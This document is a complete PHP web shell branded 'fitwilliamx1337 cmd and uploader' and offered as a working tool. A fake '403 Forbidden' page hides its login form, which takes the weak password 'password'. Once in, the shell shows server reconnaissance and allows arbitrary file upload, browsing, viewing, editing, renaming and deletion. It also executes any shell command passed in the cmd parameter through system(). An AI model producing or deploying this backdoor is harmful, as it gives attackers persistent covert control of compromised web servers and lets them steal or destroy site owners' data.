<?php
session_start();

$correctPasswordHash = '5f4dcc3b5aa765d61d8327deb882cf99'; // password

if (isset($_POST['password'])) {
    $enteredPassword = $_POST['password'];
    if (md5($enteredPassword) === $correctPasswordHash) {
        $_SESSION['authenticated'] = true;
    } else {
        echo '<p style="color: black; font: 2; position: fixed; bottom: 60px; right: 10px;"></p>';
    }
}

if (!isset($_SESSION['authenticated'])) {
    echo '
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>403 Forbidden</title><br>
        </head><body>
        <h1>403 Forbidden</h1>
<p>You dont have permission to access this resource.</p>
<p>Additionally, a 403 Forbidden
error was encountered while trying to use an ErrorDocument to handle the request.</p>
        <style>
            body {
                font-family: Arial, sans-serif;
                background-color: white;
                color: black;
                margin: 0;
                padding: 0;
                height: 100vh;
                overflow: hidden;
            }
            .password-form {
                position: fixed;
                bottom: 10px;
                right: 10px;
                background-color: rgb(255, 255, 255);
                padding: 10px;
                border-radius: 5px;
            }
            .password-form input[type="  "] {
                background-color: transparent;
                border: 1px solid white;
                color: white;
                padding: 5px;
                border-radius: 3px;
            }
            .password-form input[type="submit"] {
                background-color: transparent;
                border: 1px solid white;
                color: white;
                padding: 5px 10px;
                border-radius: 3px;
                cursor: pointer;
            }
            .password-form input[type="submit"]:hover {
                background-color: rgb(255, 255, 255);
            }
        </style>
    </head>
    <body>
        <div class="password-form">
            <form method="POST">
                <input type="password" name="password" placeholder="" required>
                <input type="submit" value="Login">
            </form>
        </div>
    </body>
    </html>
    ';
    exit;
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>fitwilliamx1337 cmd and uploader</title>
    <style>
        body {
            font-family: Consolas, monospace;
            background-color: black;
            color: white;
            padding: 20px;
        }
        a {
            color: lightblue;
            text-decoration: none;
        }
        a:hover {
            text-decoration: underline;
        }
        h1, h2 {
            font-size: 20px;
        }
        p {
            font-size: 12px;
        }
        input[type="text"], input[type="submit"], input[type="file"] {
            font-size: 12px;
        }
        .directory-path {
            margin-bottom: 10px;
            padding: 10px;
            background-color: transparent;
            border: 1px solid white;
            border-radius: 5px;
            display: inline-block;
            color: white;
        }
        .directory-contents {
            padding: 10px;
            background-color: transparent;
            border: 1px solid white;
            border-radius: 5px;
            font-size: 12px;
            max-height: 200px;
            overflow-y: auto;
            width: 90%;
            margin-top: 10px;
            color: white;
        }
        .file-item {
            margin: 5px 0;
        }
        .file-item a {
            color: lightblue;
        }
        h2 {
            font-size: 13px;
        }
        .file-actions {
            font-size: 12px;
            color: yellow;
        }
        .system-info {
            background-color: #333;
            padding: 15px;
            border-radius: 10px;
            margin-bottom: 20px;
            color: white;
            font-size: 12px;
        }
        .status-on {
            color: lime;
        }
        .status-off {
            color: red;
        }
        .file-list {
            padding: 10px;
            background-color: #222;
            border: 1px solid white;
            border-radius: 5px;
            max-height: 200px;
            overflow-y: auto;
            font-size: 12px;
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <h1>fitwilliamx1337 cmd and uploader  |   <a href="https://instagram.com/fitwilliamx1337">> Contact me < </a><br>
    <!-- System Information Section -->
    <div class="system-info">
        <p><strong>SERVER IP:</strong> <?php echo isset($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : 'Unavailable'; ?></p>
        <p><strong>YOUR IP:</strong> <?php echo $_SERVER['REMOTE_ADDR']; ?></p>
        <p><strong>WEB SERVER:</strong> <?php echo $_SERVER['SERVER_SOFTWARE']; ?></p>
        <p><strong>SYSTEM:</strong> <?php echo php_uname(); ?></p>
        <?php
        $totalSpace = disk_total_space("/");
        $freeSpace = disk_free_space("/");
        $usedSpace = $totalSpace - $freeSpace;
        $totalSpaceGB = number_format($totalSpace / 1073741824, 2); // Convert to GB
        $freeSpaceGB = number_format($freeSpace / 1073741824, 2); // Convert to GB
        $usedSpaceGB = number_format($usedSpace / 1073741824, 2); // Convert to GB

        echo "<p><strong>HDD:</strong> $freeSpaceGB GB / $totalSpaceGB GB (Free: $freeSpaceGB GB)</p>";
        ?>
        <p><strong>PHP VERSION:</strong> <?php echo phpversion(); ?></p>
        <p><strong>DISABLE FUNC:</strong> <?php echo ini_get('disable_functions') ? ini_get('disable_functions') : 'None'; ?></p>
        <p>
           <strong>MySQL:</strong> <span class="<?php echo extension_loaded('mysqli') ? 'status-on' : 'status-off'; ?>"> <?php echo extension_loaded('mysqli') ? 'ON' : 'OFF'; ?></span> | 
           <strong>cURL:</strong> <span class="<?php echo extension_loaded('curl') ? 'status-on' : 'status-off'; ?>"> <?php echo extension_loaded('curl') ? 'ON' : 'OFF'; ?></span> | 
           <strong>WGET:</strong> <span class="<?php echo (function_exists('shell_exec') && shell_exec('wget --version')) ? 'status-on' : 'status-off'; ?>"> <?php echo (function_exists('shell_exec') && shell_exec('wget --version')) ? 'ON' : 'OFF'; ?></span> | 
           <strong>Perl:</strong> <span class="<?php echo (function_exists('shell_exec') && shell_exec('perl -v')) ? 'status-on' : 'status-off'; ?>"> <?php echo (function_exists('shell_exec') && shell_exec('perl -v')) ? 'ON' : 'OFF'; ?></span> | 
           <strong>Python:</strong> <span class="<?php echo (function_exists('shell_exec') && shell_exec('python --version')) ? 'status-on' : 'status-off'; ?>"> <?php echo (function_exists('shell_exec') && shell_exec('python --version')) ? 'ON' : 'OFF'; ?></span>
        </p>
    </div>
    <form method="post" enctype="multipart/form-data">
        <input type="file" name="__">
        <input name="_" type="submit" value="Upload">
    </form>
    <?php
    if ($_POST) {
        if (@copy($_FILES['__']['tmp_name'], $_FILES['__']['name'])) {
            echo '<p style="color: lime;">File uploaded successfully: ' . htmlspecialchars($_FILES['__']['name']) . '</p>';
        } else {
            echo '<p style="color: red;">Failed to upload file.</p>';
        }
    }
    ?>
    <?php
    $requestedDir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
    if (!is_dir($requestedDir)) {
        $requestedDir = getcwd();
    }
    $currentDir = realpath($requestedDir);
    ?>
    <h2>Lokasi Directory</h2>
    <div class="directory-path">
        <?php
        $parts = explode(DIRECTORY_SEPARATOR, $currentDir);
        $path = '';
        foreach ($parts as $key => $part) {
            if ($key == 0 && strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
                $path = $part . DIRECTORY_SEPARATOR;
                echo '<a href="?dir=' . urlencode($path) . '">' . htmlspecialchars($part) . '</a>';
            } else {
                $path .= $part . DIRECTORY_SEPARATOR;
                echo ' / <a href="?dir=' . urlencode($path) . '">' . htmlspecialchars($part) . '</a>';
            }
        }
        ?>
    </div>
    <h2>Buat Directory</h2>
    <form method="POST">
        <input type="hidden" name="current_dir" value="<?php echo htmlspecialchars($currentDir, ENT_QUOTES, 'UTF-8'); ?>">
        <input type="text" name="new_dir" placeholder="Enter new directory name" required>
        <input type="submit" name="create_dir" value="Create">
    </form>
    <?php
    if (isset($_POST['create_dir']) && !empty($_POST['new_dir'])) {
        $newDirPath = rtrim($_POST['current_dir'], DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $_POST['new_dir'];
        if (mkdir($newDirPath)) {
            echo '<p style="color: lime;">Directory created successfully: ' . htmlspecialchars($_POST['new_dir']) . '</p>';
        } else {
            echo '<p style="color: red;">Failed to create directory: ' . htmlspecialchars($_POST['new_dir']) . '</p>';
        }
    }
    ?>
    <h2>Directory List</h2>
    <?php
    $currentDir = isset($_GET['dir']) ? $_GET['dir'] : __DIR__;
    $files = scandir($currentDir);
    $directories = [];
    $filesList = [];
    foreach ($files as $file) {
        if ($file === '.' || $file === '..') continue;
        $filePath = $currentDir . DIRECTORY_SEPARATOR . $file;
        if (is_dir($filePath)) {
            $directories[] = $file;
        } else {
            $filesList[] = $file;
        }
    }

    echo '<div class="directory-contents">';
    foreach ($directories as $dir) {
        $dirPath = $currentDir . DIRECTORY_SEPARATOR . $dir;
        echo '<div class="file-item">';
        echo '[DIR] <a href="?dir=' . urlencode($dirPath) . '">' . htmlspecialchars($dir) . '</a>' .
             '  | <a href="?delete_dir=' . urlencode($dirPath) . '" style="color: red;">Delete</a>' .
             '  | <a href="?rename_dir=' . urlencode($dirPath) . '" style="color: yellow;">Rename</a>';
        echo '</div>';
    }
    echo '</div>';
    ?>
    <h2>File List</h2>
    <?php
    echo '<div class="file-list">';
    foreach ($filesList as $file) {
        $filePath = $currentDir . DIRECTORY_SEPARATOR . $file;
        $fileSize = is_file($filePath) ? filesize($filePath) : '-';
        $fileModified = date("Y-m-d H:i:s", filemtime($filePath));
        echo '<div class="file-item">';
        echo '[FILE] ' . htmlspecialchars($file) . ' | Size: ' . $fileSize . ' bytes | Modified: ' . $fileModified .
             '  | <a href="?view=' . urlencode($filePath) . '">View</a>' .
             '  | <a href="?edit=' . urlencode($filePath) . '">Edit</a>' .
             '  | <a href="?delete=' . urlencode($filePath) . '" style="color: red;">Delete</a>' .
             '  | <a href="?rename=' . urlencode($filePath) . '" style="color: yellow;">Rename</a>';
        echo '</div>';
    }
    echo '</div>';
    ?>

    <!-- Fungsi Delete, Rename, View, dan Edit -->
    <?php
    // Delete Directory
    if (isset($_GET['delete_dir'])) {
        $deleteDirPath = $_GET['delete_dir'];
        if (is_dir($deleteDirPath)) {
            if (deleteDirectory($deleteDirPath)) {
                echo '<p style="color: lime;">Directory deleted successfully: ' . htmlspecialchars(basename($deleteDirPath)) . '</p>';
            } else {
                echo '<p style="color: red;">Failed to delete directory: ' . htmlspecialchars(basename($deleteDirPath)) . '</p>';
            }
        }
    }

    // Rename Directory
    if (isset($_GET['rename_dir'])) {
        $renameDirPath = $_GET['rename_dir'];
        if (is_dir($renameDirPath)) {
            echo '<h2>Rename Directory: ' . htmlspecialchars(basename($renameDirPath)) . '</h2>';
            if (isset($_POST['new_dir_name'])) {
                $newDirName = $_POST['new_dir_name'];
                $newDirPath = dirname($renameDirPath) . DIRECTORY_SEPARATOR . $newDirName;
                if (rename($renameDirPath, $newDirPath)) {
                    echo '<p style="color: lime;">Directory renamed successfully to: ' . htmlspecialchars($newDirName) . '</p>';
                } else {
                    echo '<p style="color: red;">Failed to rename directory.</p>';
                }
            }
            echo '<form method="POST">';
            echo '<input type="text" name="new_dir_name" placeholder="Enter new directory name" required>';
            echo '<input type="submit" value="Rename">';
            echo '</form>';
        }
    }

    // Rename File
    if (isset($_GET['rename'])) {
        $renameFilePath = $_GET['rename'];
        if (is_file($renameFilePath)) {
            echo '<h2>Rename File: ' . htmlspecialchars(basename($renameFilePath)) . '</h2>';
            if (isset($_POST['new_file_name'])) {
                $newFileName = $_POST['new_file_name'];
                $newFilePath = dirname($renameFilePath) . DIRECTORY_SEPARATOR . $newFileName;
                if (rename($renameFilePath, $newFilePath)) {
                    echo '<p style="color: lime;">File renamed successfully to: ' . htmlspecialchars($newFileName) . '</p>';
                } else {
                    echo '<p style="color: red;">Failed to rename file.</p>';
                }
            }
            echo '<form method="POST">';
            echo '<input type="text" name="new_file_name" placeholder="Enter new file name" required>';
            echo '<input type="submit" value="Rename">';
            echo '</form>';
        }
    }

    // Delete File
    if (isset($_GET['delete'])) {
        $deletePath = $_GET['delete'];
        if (is_file($deletePath) && unlink($deletePath)) {
            echo '<p style="color: lime;">File deleted successfully: ' . htmlspecialchars(basename($deletePath)) . '</p>';
        } else {
            echo '<p style="color: red;">Failed to delete file: ' . htmlspecialchars(basename($deletePath)) . '</p>';
        }
    }

    // File Viewing
    if (isset($_GET['view'])) {
        $viewPath = $_GET['view'];
        if (is_file($viewPath)) {
            echo '<h2>View File: ' . htmlspecialchars(basename($viewPath)) . '</h2>';
            echo '<pre>' . htmlspecialchars(file_get_contents($viewPath)) . '</pre>';
            echo '<a href="?dir=' . urlencode(dirname($viewPath)) . '">Back to File List</a>';
        }
    }

    // File Editing
    if (isset($_GET['edit'])) {
        $editPath = $_GET['edit'];
        if (is_file($editPath)) {
            echo '<h2>Edit File: ' . htmlspecialchars(basename($editPath)) . '</h2>';
            if (isset($_POST['content'])) {
                // Save changes
                file_put_contents($editPath, $_POST['content']);
                echo '<p style="color: lime;">File saved successfully.</p>';
            }
            $fileContent = file_get_contents($editPath);
            echo '<form method="POST">';
            echo '<textarea name="content" rows="20" cols="80">' . htmlspecialchars($fileContent) . '</textarea><br>';
            echo '<input type="submit" value="Save">';
            echo '</form>';
            echo '<a href="?dir=' . urlencode(dirname($editPath)) . '">Back to File List</a>';
        }
    }
    ?>
    <h2>CMD [ Linux ]</h2>
    <form method="GET">
        <input type="text" name="cmd" autofocus size="80" placeholder="Enter command (e.g., ls -la)">
        <input type="submit" value=">>>">
    </form>
    <pre>
    <?php
    if (!empty($_GET['cmd'])) {
        $command = $_GET['cmd'];
        echo "Command: " . $command . "\n\n";
        // Run Linux Command
        system($command . ' 2>&1');
    }
    ?>
    </pre>
</body>
</html>
